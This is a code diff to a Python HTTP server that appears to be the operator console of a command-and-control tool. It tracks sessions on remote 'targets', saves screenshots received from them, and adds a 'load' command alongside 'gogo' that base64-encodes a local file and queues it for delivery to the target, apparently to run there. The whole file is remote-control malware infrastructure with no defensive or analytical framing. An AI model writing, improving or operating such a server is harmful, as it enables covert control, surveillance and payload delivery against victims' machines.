@@ -7,6 +7,7 @@ import zlib
 import base64
 import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import tempfile
 
 # Globals to keep track of sessions and session data
 sessions          = {'0':0}
@@ -15,9 +16,13 @@ session_commands  = {'0':[]}
 selected_session = '0'
 
 def bmp(data):
-    d = json.loads(data)
-    with open("D:\\bitmap.bmp", "wb") as f:
-        f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))
+    try:
+        d = json.loads(data)
+        with tempfile.NamedTemporaryFile(mode="wb", delete=False, suffix=".bmp") as f:
+            f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))
+        return f.name
+    except Exception as e:
+        return f"Error saving screenshot: {e}"
 
 class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -43,8 +48,7 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         if (received != b"none"):
             print("[ {} ]".format(command))
             if command.startswith("screenshot"):
-                print("Received screenshot!")
-                bmp(received)
+                print(f"Screenshot saved: {bmp(received)}")
             else:
                 for line in str(received)[2:-1].split("\\n"):
                     print(line)
@@ -125,12 +129,16 @@ def user_interface():
         elif len(command.strip()) < 2:
             pass
         # Valid command to send to target
-        elif command.split()[0].strip() in session_commands[selected_session]:
-            if command.startswith("gogo"):
-                file = command.split()[-1]
-                with open(file, "rb") as f:
-                    data = f.read()
-                command = "gogo " + base64.b64encode(data).decode()
+        elif command.split()[0].strip() in session_commands[selected_session] + ["load"]:
+            if command.startswith("gogo") or command.startswith("load"):
+                try:
+                    file = command.split()[-1]
+                    with open(file, "rb") as f:
+                        data = f.read()
+                    command = "gogo " + base64.b64encode(data).decode()
+                except Exception as e:
+                    print(f"Error with command: {e}")
+                    continue
             session_queues[selected_session].put(command)
             print(f'Queued data for session {selected_session}.')
 
